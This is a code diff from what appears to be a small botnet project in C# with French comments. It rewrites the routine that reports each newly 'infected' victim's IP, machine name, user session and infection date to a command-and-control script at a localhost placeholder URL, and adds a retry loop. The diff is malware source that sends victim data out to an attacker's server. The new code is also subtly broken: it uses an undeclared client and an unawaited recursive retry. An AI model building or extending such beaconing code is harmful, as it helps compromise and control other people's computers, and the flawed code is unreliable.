@@ -5,6 +5,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Collections.Specialized;
+using System.Threading;
 
 namespace Botnet
 {
@@ -29,26 +30,37 @@ namespace Botnet
             //Générer un machine ID
         }
 
-        public void sendInfoToCNC()
+        //Raph: à mon avis la méthode est très bancale, je ne penses que c'est comme ça qu'il faut utiliser uen fonction asynchrone
+        public async Task sendInfoToCNCAsync()
         {
-            //Envoyer l'ip, le port, le nom de machine et autres infos essentielles pour pouvoir contrôler les victimes (via HTTP/s?)
-            //Les informations sont récupérés au travers de d'un objet tools
-            Tools info = new Tools();
-            
-            using (var client = new System.Net.WebClient())
+            try
             {
-                var values = new NameValueCollection();
-                values["ip"] = info.ip;
-                values["port"] = "2107";
-                values["os"] = info.os;
-                values["machine_name"] = info.machine_name;
-                values["user_session"] = info.user_session;
-                values["infection_date"] = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss"); //format UTC 0 
+                Tools info = new Tools();
+                var values = new Dictionary<string, string>
+                {
+                   {"ip", info.ip },
+                   {"port" , "2107" },
+                   { "os" , "asyncTEST" },
+                   { "machine_name" , info.machine_name },
+                   { "user_session" , info.user_session },
+                   { "infection_date" , DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") }, //format UTC 0 
+                };
 
-                var response = client.UploadValues("http://127.0.0.1/botnet/newvictim.php", values);
+                var content = new FormUrlEncodedContent(values);
 
-                var responseString = Encoding.Default.GetString(response);
+                //await signifie l'obligation d'attendre l'execution complète de l'instruction suivante
+                var response = await client.PostAsync("http://127.0.0.1/botnet/newvictim.php", content);
+
+                var responseString = await response.Content.ReadAsStringAsync();
                 Console.WriteLine(responseString);
+               
+            }
+            catch(Exception e)
+            {
+                Console.WriteLine("Exeption levée dans Initialization.sendInfoToCNCAsync(): " + e.Message + "\nSeconde tentative dans 10000 milisecondes (10 secondes)");
+                Console.WriteLine(e.Message);
+                Thread.Sleep(10000);
+                sendInfoToCNCAsync();
             }
         }
     }
